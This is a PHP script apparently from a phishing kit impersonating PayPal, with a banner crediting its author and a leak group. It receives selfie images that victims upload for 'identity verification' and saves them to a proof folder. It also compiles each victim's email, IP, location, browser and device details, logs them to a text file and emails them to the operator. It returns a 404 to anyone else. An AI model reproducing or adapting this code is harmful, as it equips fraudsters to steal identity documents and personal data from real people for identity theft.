<?php
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
FuCkEd By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/
	
    if(isset($_POST['id_slf'])&&isset($_POST['images'])){
	session_start();
	include '../bot.php';
	include '../mine.php';
	function upImg($vl){
		$t=microtime(true);
		$micro=sprintf("%06d",($t - floor($t))* 1000000);
		$today=date("m.d.y.h.i.s.U".$micro,$t);
		$name=hash('md5',$today);
		$type=explode(';',$vl)[0];
		$type='.'.explode('/',$type)[1];
		$base= 'Folder -> proof Image Name ->';
		file_put_contents('./../../proof/'.$name.$type,base64_decode(explode(',',$vl)[1]));
		return $base.$name.$type;
	}
	$msg="=========== <[ -".$scamname."- PPL SELFIE ]> ===========\r\n";
	$msg.="ID OF USER	: {$_SESSION['EML']}\r\n";
	$msg.="SELFIE OF	: {$_SESSION['doc_type']}\r\n";
	for($i=0;$i<count($_POST['images']);
		$i++)
	{
		$msg.="FACE (".(int)($i+1).")	: ".upImg($_POST['images'][$i])."\r\n";
}
$msg.="---------------------- IP Info ----------------------\r\n";
$msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
$msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
$msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
$msg.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
$msg.="SCREEN		: {$_SESSION['screen']}\r\n";
$msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
$msg.="TIME		: ".now()." GMT\r\n";
	$msg.="=========== <[ THANKS TO SH33NZ0 ]> ===========\r\n\r\n\r\n";
		if ($saveintext=="yes") {
	$save=fopen("../../".$filename.".txt","a+");
fwrite($save,$msg);
fclose($save);
}
$subject="-".$scamname."- PPL SELFIE OF [".$_SESSION['doc_type']."] From [".$_SESSION['ip_countryName']."]";
$headers="From: xAthena <selfie@".$_SERVER['SERVER_NAME'].">\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($sendtoemail=="yes") {
	@mail($yours,$subject,$msg,$headers);
}
exit('done');
}if(!isset($_POST['id_slf'])){
     header('HTTP/1.0 404 Not Found');
}
?>